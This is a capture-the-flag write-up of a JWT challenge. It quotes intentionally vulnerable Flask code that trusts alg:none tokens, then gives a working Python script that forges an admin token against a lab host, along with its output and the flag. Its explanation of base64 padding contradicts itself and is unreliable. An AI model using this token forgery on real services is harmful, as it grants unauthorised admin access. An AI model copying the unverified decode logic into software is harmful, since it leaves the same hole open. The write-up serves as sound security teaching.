# Unverified — ADF2026 Hackathon

**Category:** Crypto  
**Challenge:** Sometimes, it's enough to say you're important. The system won't ask questions if you sound convincing.

---

## Challenge Overview

A Flask web application implementing JWT-based authentication with three endpoints:

- `/register` — Creates a new user, returns an HS256-signed JWT with `is_admin: false`
- `/login` — Verifies the JWT signature (HS256), sets a Flask session cookie on success  
- `/dashboard` — Reads the JWT header manually, and if `alg == "none"`, decodes **without verification** and checks `is_admin`

The flag is returned when the dashboard sees `is_admin: true` in the token payload.

## Source Code Analysis

### `crypto/jwt.py` — Custom JWT Logic

```python
SECRET_KEY = os.urandom(16).hex()

def create_session(username):
    return jwt.encode({'username': username, 'is_admin': False}, 
                      key=SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        username = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])['username']
        return True, username
    except:
        return False, None

def decode_payload(token):
    header = json.loads(b64decode(token.split('.')[0].encode()))
    if 'alg' not in header:
        return None
    if header['alg'] != 'none':
        return None
    return jwt.decode(token, algorithms=['none'], 
                      options={'verify_signature': False})
```

### `views.py` — Dashboard Endpoint

```python
@bp.route('/dashboard', methods=['POST'])
def dashboard():
    # ... session check ...
    token = headers['Authorization'].split('Bearer ')[1]
    
    # the token was already verified when user logged in, no need to verify again
    payload = decode_payload(token)
    if payload['is_admin']:
        return jsonify({..., 'content': f"I recently found out about {open('/flag.txt').read()}..."})
```

## Vulnerability

**Two-phase trust model bypass:**

1. **Phase 1 (Login):** Uses `verify_token()` which requires a valid HS256-signed JWT. This establishes the Flask session and marks the user as "verified."

2. **Phase 2 (Dashboard):** Accepts a *different* token via the `Authorization` header. Uses `decode_payload()` which explicitly checks for `alg: none` and then calls `jwt.decode()` with **no signature verification**.

The dashboard trusts that the token was "already verified" during login — but the Authorization header can contain a *completely different token* than the one used for login.

Since `decode_payload()` only accepts tokens with `alg: none` and disables signature verification, we can craft a self-signed token with `is_admin: true`.

### Attack Flow

```
┌──────────┐     ┌──────────┐     ┌───────────┐
│ REGISTER │────▶│  LOGIN   │────▶│ DASHBOARD │
│ HS256    │     │ HS256 ✓  │     │ alg:none  │
│ JWToken  │     │ Session ✓ │     │ is_admin  │
└──────────┘     └──────────┘     │ = true    │
                                  └───────────┘
```

## How We Solved It — Reasoning

**Initial hypothesis:** Classic `alg:none` JWT attack — register, login, then hit dashboard with a forged `alg:none` token.

**First attempt:** Stripped base64 padding with `.rstrip('=')` — all dashboard requests returned **HTTP 500**. Despite the header parsing correctly (verified by decoding locally), the server crashed.

**Debugging:** Tried multiple token formats:
- `header.payload.` (trailing dot, no padding) → 500
- `header.payload` (no trailing dot, no padding) → 500  
- `header.payload.sig` (dummy signature, no padding) → 500

**Key insight:** The server's `b64decode` (from Python's `base64` module) requires proper `=` padding. Without padding, the base64 string length may not be a multiple of 4, causing `b64decode` to fail → `json.loads` crashes → 500.

**Working approach:** Kept the `=` padding in both header and payload base64 strings, with the trailing dot format: `header=.payload=.`.

The padding requirement was the critical detail — standard `base64.b64decode` is lenient and accepts unpadded input, but this server environment may have stricter validation or a wrapping layer that enforces it.

## Exploit

```python
import requests
import base64

TARGET = "http://154.57.164.64:32626"
s = requests.Session()

# Step 1: Register to get valid token
resp = s.post(f"{TARGET}/register", json={
    "username": "attacker001",
    "password": "password123"
})
valid_token = resp.headers["Authorization"].split("Bearer ")[1]

# Step 2: Login with valid token (establishes session)
resp = s.post(f"{TARGET}/login", headers={
    "Authorization": f"Bearer {valid_token}"
})

# Step 3: Forge alg:none token WITH padding
header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode()
payload = base64.b64encode(b'{"username":"attacker001","is_admin":true}').decode()
forged_token = f"{header}.{payload}."

# Step 4: Dashboard with forged token
resp = s.post(f"{TARGET}/dashboard", headers={
    "Authorization": f"Bearer {forged_token}"
})
print(resp.json())
```

### Output
```json
{
  "content": "I recently found out about HTB{always_check_the_integrity_of_the_JWT_tokens_eabf1a11e85828d2959d884416189793}. What do you think of that?",
  "new_messages": true,
  "status_code": 200
}
```

## Flag

```
HTB{always_check_the_integrity_of_the_JWT_tokens_eabf1a11e85828d2959d884416189793}
```

## Lessons Learned

1. **Never trust the client's token choice after authentication.** The dashboard accepted a *different* token than what was verified during login.
2. **The `alg:none` vulnerability is still alive** — `decode_payload()` explicitly gates on `alg: none` and disables signature verification.
3. **Base64 padding matters.** Stripping `=` padding broke `b64decode` on the server, causing silent 500s that obscured the real issue.
4. **Session ≠ Authorization.** The Flask session marks "you logged in" but doesn't validate what token you present later. Always **re-verify** the Authorization header token on every privileged endpoint.
